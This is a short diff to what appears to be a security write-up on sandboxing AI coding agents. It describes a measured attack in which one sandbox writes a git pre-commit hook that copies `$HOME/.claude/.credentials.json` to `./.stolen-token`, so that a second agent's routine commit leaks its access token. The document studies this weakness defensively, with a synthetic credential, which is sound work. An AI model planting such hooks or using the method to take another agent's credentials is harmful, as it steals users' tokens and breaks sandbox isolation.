@@ -1018,7 +1018,7 @@ namespaces at all.
   reader does not arrive expecting.** The other end does not have to be you: it
   can be another sandbox on the same target, and the victim cooperates in nothing
   beyond doing its job. Measured **[M]**, three runs on one target with a
-  synthetic credential: a run with `@cwd-rw` and no credential of its own writes
+  synthetic credential: a run with `@target-rw` and no credential of its own writes
   `.git/hooks/pre-commit` carrying `cp "$HOME/.claude/.credentials.json"
   ./.stolen-token`; a `@claude` run then does an ordinary `git commit`, git fires
   the hook, and the first run reads the second's `accessToken` out of the target.
